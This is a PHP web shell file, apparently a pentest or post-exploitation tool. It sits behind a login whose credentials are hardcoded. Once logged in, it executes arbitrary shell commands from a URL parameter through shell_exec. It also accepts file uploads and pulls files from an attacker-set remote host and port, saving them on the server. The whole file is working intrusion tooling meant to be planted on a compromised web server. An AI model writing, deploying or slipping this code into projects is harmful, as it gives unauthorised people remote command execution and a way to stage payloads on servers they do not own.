<?php
session_start();
	if (($_SESSION['valid'] === null or $_SESSION['logged_in'] === false) or (!array_key_exists('valid', $_SESSION) or $_SESSION['valid'] !== true)) {
		login();
	} else {
		displayForm();
	}

	function displayForm() {
		if (!$_SESSION['valid']) {
			abortProgram();
		}

		$output = ""; # Leave this blank
		# Remote host details
		$rhost = "127.0.0.1";
		$rport = "9001"; 

		if (isset($_FILES['fileToUpload'])) {
			$output = "";
			$fileName = basename($_FILES["fileToUpload"]["name"]);
			$file_tmp =$_FILES['fileToUpload']['tmp_name'];
			move_uploaded_file($file_tmp, $fileName);
		}

		if (isset($_POST['remoteFile'])) {
			$output = "";
      file_put_contents($_POST['remoteFile'], file_get_contents("http://$rhost:$rport/" . $_POST['remoteFile']));
    }
    if (isset($_GET['cmd'])) {
			$output .= "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
		}

		if (isset($_POST['logout'])) {
			logout();
			header("Refresh:0");
		}

		echo <<<HTML
			<html>
				<body>

					<form method="POST">
						<p> <input type="submit" value="Logout" name="logout">
					</form>

				<br>
					<form action="" method="POST" enctype="multipart/form-data">
						<input type="hidden" name="MAX_FILE_SIZE" value="1000000">
						<p> Local Upload: <input type="file" name="fileToUpload">
						<input type="submit" name="upload">
					</form>

					<br>

					<form action="" method="POST" enctype="multipart/form-data">
						<p> Fetch From Remote: <input type="text" name="remoteFile">
						<input type="submit" name="fetch">
					</form>

					<br>

					<form method="GET">
						<p>CMD: <input type="text" name="cmd">
							<input type="submit" value="Exec">
					</form>
						<pre>
							$output
						</pre>
			</body>
		</html>
HTML;
}

	function login() {
		$output = "<pre>"  . "Username and password required. Ensure creds have been added to source." . "</pre>";
		$masterUser = "";
		$masterPassword = "";

		if (isset($_POST['username']) and isset($_POST['password'])) {
			if ($masterUser === "" or $masterPassword === "") {
				abortProgram();
			}

			if ($_POST['username'] === $masterUser and $_POST['password'] === $masterPassword) {
				$_SESSION['valid'] = true;
				$_SESSION['logged_in'] = true;
				$_SESSION['timeout'] = time();
				displayForm();
			} else {
				$output = "<pre>"  . "Invalid credentials" . "</pre>";
			}
		}

	if($_SESSION['valid'] !== true) {
		echo <<<HTML
		<html>
				<body>
				<form method="POST">
					 <input type="text" title="username" placeholder="username" name="username"/>
					 <input type="password" title="username" placeholder="password" name="password"/>
					 <button type="submit" class="btn">Login</button>
				</form>
					<pre>
						$output
					</pre>
			 	</body>
	 </html>
HTML;
	}
	}

	function abortProgram() {
		echo <<<HTML
		<html>
				<body>
					<pre> No password set. Access Denied. Aborting. </pre>
			 	</body>
	 </html>
HTML;
		exit();
	}
	
	function logout() {
		unset($_SESSION['valid']);
		unset($_SESSION['logged_in']);
		session_destroy();
	}

?>
